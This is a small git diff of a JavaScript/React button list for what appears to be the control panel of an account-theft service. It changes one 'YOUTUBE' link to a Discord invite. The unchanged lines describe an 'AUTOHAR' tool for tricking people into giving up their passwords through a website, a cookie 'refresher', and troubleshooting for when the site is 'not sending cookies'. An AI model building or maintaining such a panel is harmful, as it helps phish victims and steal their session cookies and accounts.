@@ -10,7 +10,7 @@ const buttons = [
   { id: 3, label: "AUTOHAR", info: "Autohar is a way of tricking someone into giving you there ps through a website (AUTOHAR IS NOT MINE)", href: "https://bloxtools.in/controlPage/create" },
   { id: 4, label: "REFRESHER", info: "Refresh your cookies that you get to prevent theft over others if wanted", href: "https://inju.cc/tools/refresher" },
   { id: 5, label: "TROUBLESHOOT", info: "If you are new or if site is not sending cookies, or hit title is something other than 'INJURIES' Use this", href: "https://discord.com/channels/1286805719911370783/1333224210398445588" },
-  { id: 6, label: "YOUTUBE", info: "We currently dont have one at the moment", href: "/control" }
+  { id: 6, label: "YOUTUBE", info: "We currently dont have one at the moment", href: "https://discord.gg/injuv3" }
 ];
 
 export default function Home() {
